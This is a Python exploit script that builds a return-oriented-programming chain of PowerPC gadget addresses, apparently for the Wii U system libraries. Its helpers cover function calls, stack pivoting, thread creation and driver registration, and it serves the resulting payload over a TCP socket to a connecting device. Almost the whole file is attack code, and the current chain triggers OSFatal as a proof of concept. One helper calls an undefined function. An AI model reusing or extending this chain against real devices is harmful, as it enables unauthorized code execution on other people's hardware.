import socket, time, struct


ROP_POPJUMPLR_STACK12 = 0x0101CD24
ROP_POPJUMPLR_STACK20 = 0x01024D88
ROP_CALLFUNC = 0x01080274
ROP_CALLR28_POP_R28_TO_R31 = 0x0107DD70
ROP_POP_R28R29R30R31 = 0x0101D8D4
ROP_POP_R27 = 0x0101CB00
ROP_POP_R24_TO_R31 = 0x010204C8
ROP_CALLFUNCPTR_WITHARGS_FROM_R3MEM = 0x010253C0
ROP_SETR3TOR31_POP_R31 = 0x0101CC10
ROP_Register = 0x010277B8
ROP_CopyToSaveArea = 0x010277DC
ROP_memcpy = 0x01035FC8
ROP_DCFlushRange = 0x01023F88
ROP_ICInvalidateRange = 0x010240B0
ROP_OSSwitchSecCodeGenMode = 0x010376C0
ROP_OSCodegenCopy = 0x010376D8
ROP_OSGetCodegenVirtAddrRange = 0x010375C0
ROP_OSGetCoreId = 0x01024E8C
ROP_OSGetCurrentThread = 0x01043150
ROP_OSSetThreadAffinity = 0x010429DC
ROP_OSYieldThread = 0x010418E4
ROP_OSFatal = 0x01031618
ROP_Exit = 0x0101CD80
ROP_OSScreenFlipBuffersEx = 0x0103AFD0
ROP_OSScreenClearBufferEx = 0x0103B090
ROP_OSDynLoad_Acquire = 0x0102A3B4
ROP_OSDynLoad_FindExport = 0x0102B828
ROP_os_snprintf = 0x0102F160
ROP_GX2Init = 0x01156B78
ROP_GX2Flush = 0x011575AC
ROP_GX2WaitForVsync = 0x01151964
ROP_GX2DirectCallDisplayList = 0x01152BF0

ROP_Restart = 0x02019A80 - 0xFE3C00
ROP_OSDriver_Register = 0x010277B8
ROP_OSDriver_Deregister = 0x010277C4
ROP_OSDriver_CopyFromSaveArea = 0x010277D0
ROP_OSDriver_CopyToSaveArea = 0x010277DC
ROP_OSBlockMove = 0x02019EE4 - 0xFE3C00
ROP_OSExitThread = 0x0202596C - 0xFE3C00 
ROP_memset = 0x02019BB4 - 0xFE3C00
ROP_memclr = 0x02019BBC - 0xFE3C00
ROP_OSSendAppSwitchRequest = 0x0201D830 - 0xFE3C00
ROP_Syscall_0x01 = 0x02014A5C - 0xFE3C00

# coreinit init 0x0200890C = pop r5

#0x04		rop2[0x164/4] = r6load_addr;
#0x08		rop2[0x168/4] = 0; # r9 ici
#0x0C		rop2[0x16c/4] = 0;
#0x10		rop2[0x170/4] = 0; # r3 stocker ici | r0 = r3
#0x14		rop2[0x174/4] = 4; # r6
#0x18		rop2[0x178/4] = 0;
#0x1C		rop2[0x17C/4] = 0;
#0x20		rop2[0x180/4] = 0;
#0x24		rop2[0x184/4] = 0;
#0x28		rop2[0x188/4] = 0;
#0x2C		rop2[0x18c/4] = stack2 + 0x1c0; # r31 -> ptr to function
#0x30		rop2[0x190/4] = 0;
#0x04		rop2[0x194/4] = sigwait_addr; # lr


#hex(0x02000020 + (0xa5dde4 - 0x76C))
#hex(0x02000000 + (0x8C10 - 0x304))


def _byteswap_long(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]


# A packet may contain more than 1000 bytes,
# enough room to build a nice ROP chain
rop_payload = [0]

def ropgen_setr3(r3=0, r4=0):
	rop_payload.append(0x0110C904)
	rop_payload.append(r3)
	rop_payload.append(r4) # r4
	rop_payload.append(r4)

def tiny_call(fptr, r3=0, r4=0):
	ropgen_setr3(r3, r4)
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(r4)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def call_noargs(fptr):
	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(fptr)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def ropgen_write_r3r4_tomem(outaddr):

	rop_payload.append(ROP_POP_R28R29R30R31)
	rop_payload.append(ROP_OSGetCodegenVirtAddrRange + 0x20)
	rop_payload.append(0)
	rop_payload.append(outaddr)
	rop_payload.append(0x10000000)
	rop_payload.append(0)
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)

def write32(addr, value):

	ropgen_setr3(value)
	ropgen_write_r3r4_tomem(addr)

def new_tiny_call(addr, arg_ptr, arg2):
	# now we can set r3
	ropgen_setr3(arg_ptr,0)

	  
	rop_payload.append(0x2024858 - 0xFE3C00)# #0x2024858 r3 = *r3 # lwz r3, 0(r3); lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; blr; 
	rop_payload.append(0x00001234) # + 8

	# set func address to r28, arg2 to r31
	rop_payload.append(ROP_POP_R28R29R30R31) # coreinit.rpl 0x020014d4: lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r30, 0x10(r1); mtlr r0; lwz r31, 0x14(r1); addi r1, r1, 0x18; blr; 
	rop_payload.append(addr) # r28 + 8
	rop_payload.append(0x00001235)     # r29 +0x0C
	rop_payload.append(0x00001236)    # r30+ 0x10
	rop_payload.append(arg2) # r31 + 0x14 
	rop_payload.append(0x00001237)     # + 0x18
	        
	# r31 will be moved to r4
	rop_payload.append(ROP_CALLR28_POP_R28_TO_R31) # coreinit: 0x02061970: mtctr r28; mr r4, r31; bctrl; lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r31, 0x14(r1); mtlr r0; lwz r30, 0x10(r1); addi r1, r1, 0x18; blr; 
	rop_payload.append(0x00001238)      # r28 + 8
	rop_payload.append(0x00001239)      # r29 + 0xC
	rop_payload.append(0x0000123A)      # r30 + 0x10
	rop_payload.append(0x0000123B)      # r31 + 0x14
	rop_payload.append(0x0000123C)      # + 0x18


def new_call(addr, arg_ptr, arg2, arg3, arg4, arg5):  
	# set r3 to arg5
	ropgen_setr3(arg5,0)
	# move it to r7
	rop_payload.append(0xC180000 + 0x028036ec)#0x028036ec: mr r7, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r7; blr; 
	rop_payload.append(0x0000DEA2)# ;r1 +8    

	# set r3 to arg3
	ropgen_setr3(arg4,0)
	# move it to r11
	rop_payload.append(0xC180000 + 0x029002ac) #0x029002ac: mr r11, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r11; blr; 
	rop_payload.append(0x0000DEA6)# ;r1 + 8
	# then we can move it to r6
	rop_payload.append(0xC180000 + 0x029dd8fc) # 0x029dd8fc: mr r6, r11; lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; clrlwi r3, r6, 0x18; blr; 
	rop_payload.append(0x0000DEA7)# ;r1 + 8
	rop_payload.append(0x0000DEA8)# ;r1 + 0xC
	rop_payload.append(0x0000DEA9)# ;r1 + 0x10

	# set arg3 to r3
	ropgen_setr3(arg3,0)  
	# move it to r5
	rop_payload.append(0xC180000 + 0x0211cb44) # : 0x0211cb44 mr r5, r3; lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; mr r3, r5; blr; 
	rop_payload.append(0x0000DEAA)# ;r1 + 8
	rop_payload.append(0x0000DEAB)# ;r1 + 0xC
	rop_payload.append(0x0000DEAC)# ;r1 + 0x10

	new_tiny_call(addr, arg_ptr, arg2)



def make_pm4_type3_packet_header(opcode, count):

	hdr = 0
	hdr |= (3 << 30)
	hdr |= ((count-1) << 16)
	hdr |= (opcode << 8)		

	return hdr

def pop_r24_to_r31(inputregs):

	rop_payload.append(ROP_POP_R24_TO_R31)
	rop_payload.append(0)
	rop_payload.append(0)

	for i in range(0, 8):
		rop_payload.append(inputregs[i])

	rop_payload.append(0)

def call_func(funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):

	input_regs = 	[r6,
					r5,
					0,
					ROP_CALLR28_POP_R28_TO_R31,
					funcaddr,
					r3,
					0,
					r4]

	pop_r24_to_r31(input_regs)

	rop_payload.append(ROP_CALLFUNC)
	rop_payload.append(r28)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)
	rop_payload.append(0)


def calc_addr(idx):
	return (0x4D120000 + (idx *4))

def sysapp_to_realaddr(addr):
	return addr + (0x0EED81C0 - 0x02000000)



def doBL(dst, src):
	newval = (dst - src)
	newval &= 0x03FFFFFC
	newval |= 0x48000001
	return newval

def userspace_to_kheap_index(addr):
  return (0x10000000 + ((addr - 0xFF200014)//16))

def OSFatal(text_addr):
	tiny_call(ROP_OSFatal, text_addr)

def DCFlushRange(addr, size):
	tiny_call(ROP_DCFlushRange, addr, size)

def GX2DirectCallDisplayList(addr, size):
	tiny_call(ROP_GX2DirectCallDisplayList, addr, size)

def GX2Flush():
	tiny_call(ROP_GX2Flush)

def OSDriver_Register(name_addr, name_size):
	call_func(ROP_OSDriver_Register, name_addr, name_size, 0, 0)

def OSDriver_CopyToSaveArea(name_addr, name_size, in_buffer, buffer_size):
	call_func(ROP_OSDriver_CopyToSaveArea, name_addr, name_size, in_buffer, buffer_size)

def OSSendAppSwitchRequest(rampid, arg1, arg2):
	call_func(ROP_OSSendAppSwitchRequest, rampid, arg1, arg2)

def StackPivot(new_stack):

	# set r3 to $arg3
	ropgen_setr3(new_stack);
	# move it to r11
	ropchain_appendu32(0xC180000 + 0x029002ac) #0x029002ac: mr r11, r3; lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; mr r3, r11; blr; 
	ropchain_appendu32(0x0000DEA6) # ;r1 + 8
	ropchain_appendu32(0xC180000 + 0x02a645b0) # ;r1 + 12 # lwz r0, 4(r11); mtlr r0; mr r1, r11; blr; 


def OSCreateThread(thread, entry, argc, argv, stack, stackSize, priority, attributes):

	inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
	inputregs[24 - 24] = 0 # #r24
	inputregs[25 - 24] = stack # #r25 # r7
	inputregs[26 - 24] = stackSize # #r26 # r8
	inputregs[27 - 24] = priority # #r27 # r9
	inputregs[28 - 24] = thread # #r28 #r3
	inputregs[29 - 24] = entry # #r29 #r4
	inputregs[30 - 24] = argc ##r30 #r5
	inputregs[31 - 24] = argv # #r31 # r6
	pop_r24_to_r31(inputregs)

	rop_payload.append(0x020257a8 - 0xFE3C00)
	rop_payload.append(2) # param #10 ;r1 +8
	rop_payload.append(attributes << 16) # r10 ;r1 +12 (lhz from this register)
	rop_payload.append(0) # ;r1 +16
	rop_payload.append(0) # r25 ;r1 +20
	rop_payload.append(0) # r26 ;r1 +24
	rop_payload.append(0) # r27 ;r1 +28
	rop_payload.append(0) # r28 ;r1 +32
	rop_payload.append(0) # r29 ;r1 +36
	rop_payload.append(0) # r30 ;r1 +40
	rop_payload.append(0) # r31 ;r1 +44 (0x2C)
	rop_payload.append(0)  


# ROP CHAIN -------------------------------------------------------------------

OSFatal(0x1000003C)

# end of ROP CHAIN -------------------------------------------------------------------



for i in range(len(rop_payload)):
	print("%3d: %08X" %(i,rop_payload[i]))

for i in range(1024 - len(rop_payload)):
	if i >= 0:
		rop_payload.append(0xF5A5A5A5)


rop_packet = struct.pack(">%iI" %len(rop_payload), *rop_payload)

input()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 12345))
s.listen(1)
conn = s.accept()
print('Connected by ', conn[1])
conn[0].send(rop_packet)